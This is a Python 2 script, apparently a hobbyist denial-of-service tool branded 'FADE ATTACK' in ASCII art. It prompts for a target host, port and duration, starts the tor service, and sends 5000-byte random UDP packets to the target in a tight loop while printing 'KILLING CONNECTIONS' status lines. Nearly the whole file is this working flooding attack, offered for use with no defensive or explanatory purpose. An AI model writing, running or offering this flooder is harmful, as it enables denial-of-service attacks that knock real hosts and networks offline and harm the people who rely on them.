#!/usr/local/bin/python
# coding: latin-1
import sys
import os
import socks
import socket
import time
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("""
bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`
""")

W = '\033[1m'
R = '\033[31m'
N = '\033[0m'
G = '\033[32m'
B = '\033[34m'
Y = '\033[33m'
LB = '\033[1;36m'


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packets = random._urandom(5000)
os.system("""
echo '''
███████╗ █████╗ ██████╗ ███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
█████╗  ███████║██║  ██║█████╗      ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██╔══╝  ██╔══██║██║  ██║██╔══╝      ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██║     ██║  ██║██████╔╝███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                                                                                      
''' | lolcat """)
target = raw_input(G+'[?] \033[0m3NTER T@RGET #:')
ip = socket.gethostbyname(target)

os.system('''echo "╔══ host ip ══╗ " | lolcat''')
print                   ip
port = input(G+'[?] \033[0m3NTER P0RT : ')
os.system('''echo "how long would you like to attack" | lolcat''')
duration = input(G+'$ ')
timeout = time.time() + duration
os.system("service tor start")
print N+"F4DE attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
os.system("sleep 2s")
sent = 0

while True:
	if time.time() > timeout:
		break
	else:
		pass
	sock.sendto(packets, (ip, port))
	sent = sent + 1
	print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)